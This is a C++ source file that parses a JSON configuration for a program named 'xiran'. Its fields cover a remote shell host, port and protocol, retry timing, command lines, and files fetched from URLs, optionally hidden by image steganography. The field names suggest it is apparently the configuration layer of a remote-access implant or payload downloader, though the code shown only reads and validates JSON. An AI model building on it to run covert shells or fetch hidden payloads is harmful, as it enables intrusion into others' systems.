#include "iostream"
#include "mutex"
#include "include/rapidjson/document.h"
#include "include/rapidjson/writer.h"
#include "include/rapidjson/stringbuffer.h"
#include "getfile.hpp"
#include <vector>
#include <string>

using namespace rapidjson;

/*
{
    "version": "1.0",
    "cmdlines": [
        "cmd1",
        "cmd2"
    ],
    "cmdIntervaltime": 123,
    "Listening_port": -1,
    "updata_time": -1,
    "enable_shell": ture,
    "shell_host": "127.0.0.1",
    "shell_port" : "12",
    "shell_protocol": "TCP",
    "retry_time": 10
}

enum Type {
    kNullType = 0,      //!< null
    kFalseType = 1,     //!< false
    kTrueType = 2,      //!< true
    kObjectType = 3,    //!< object
    kArrayType = 4,     //!< array 
    kStringType = 5,    //!< string
    kNumberType = 6     //!< number
};
*/
Document d;
std::mutex d_mtx; 
void analysis_xiran_config(const char* json)
{
    std::lock_guard<std::mutex> guard(d_mtx);

    d.Parse(json);
    if(d.GetType()!=3) throw "config error";
 
    // 版本检查
    Value& version = d["version"];
    if(version.GetType()!=5) throw "config error";
    if(strcmp(version.GetString(),"1.0")!=0) throw "config error";

    //参数确认
    // if(d["shell_host"].GetType()!=5) return false;
    // if(d["shell_port"].GetType()!=5) return false;
    // if(d["shell_protocol"].GetType()!=5) return false;
    // if( d["enable_shell"].GetType()!=1 && d["enable_shell"].GetType()!=2 ) return false;
    // if(d["retry_time"].GetType()!=6) return false;
    // if(d["filelists"].GetType()!=4) return false;

}

const char* get_shell_host()
{
    std::lock_guard<std::mutex> guard(d_mtx);
    Value& shell_host = d["shell_host"];
    if(shell_host.GetType()!=5) throw "config error";
    return shell_host.GetString();
}

const char* get_shell_port()
{
    std::lock_guard<std::mutex> guard(d_mtx);
    Value& shell_port = d["shell_port"];
    if(shell_port.GetType()!=5) throw "config error";
    return shell_port.GetString();
}

const char* get_shell_protocol()
{
    std::lock_guard<std::mutex> guard(d_mtx);
    Value& shell_protocol = d["shell_protocol"];
    if(shell_protocol.GetType()!=5) throw "config error";
    return shell_protocol.GetString();
}

bool get_enable_shell()
{
    std::lock_guard<std::mutex> guard(d_mtx);
    Value& enable_shell = d["enable_shell"];
    if(enable_shell.GetType()!=1 && enable_shell.GetType()!=2) throw "config error";
    return enable_shell.GetType()==2 ? true : false;
}

int get_retry_time()
{
    std::lock_guard<std::mutex> guard(d_mtx);
    Value& retry_time = d["retry_time"];
    if(retry_time.GetType()!=6) throw "config error";
    return retry_time.GetInt();
}

/*
"filelists" : [
        {
            //保存的文件名以及地址
            "rename":"",
            //文件获得地址
            "url":"",
            //是否使用了隐写等技术
            "hide":"no",
        }
    ],
*/
std::vector<xiran_file> get_file_list()
{
    std::lock_guard<std::mutex> guard(d_mtx);

    Value& filelists = d["filelists"];
    if(filelists.GetType()!=4) throw "config error";
    auto filearray = filelists.GetArray();
    std::vector<xiran_file> ret_files;
    for(int i=0;i<filearray.Size();i++)
    {
        try{
            auto& file = filearray[i];
            if(file.GetType()!=3) throw "config error";

            auto& rename = file["rename"];
            auto& url = file["url"];
            auto& hide = file["hide"];
            hide_type hidetype=hide_type::nohide;
            if(rename.GetType()!=5 || url.GetType()!=5 || hide.GetType()!=5) throw "config error";
            
            //匹配hide模式
            if(strcmp(hide.GetString(),"image")==0){
                //使用图片隐写技术
                hidetype = hide_type::image;
            }else if(strcmp(hide.GetString(),"no")==0){
                //未使用隐写或加密技术
                hidetype=hide_type::nohide;
            }else{
                //不支持的技术
                throw "config error";
            }
            ret_files.emplace_back(xiran_file(rename.GetString(),url.GetString(),hidetype));
        }catch(std::exception e){

        }
        
    }
    return ret_files;
}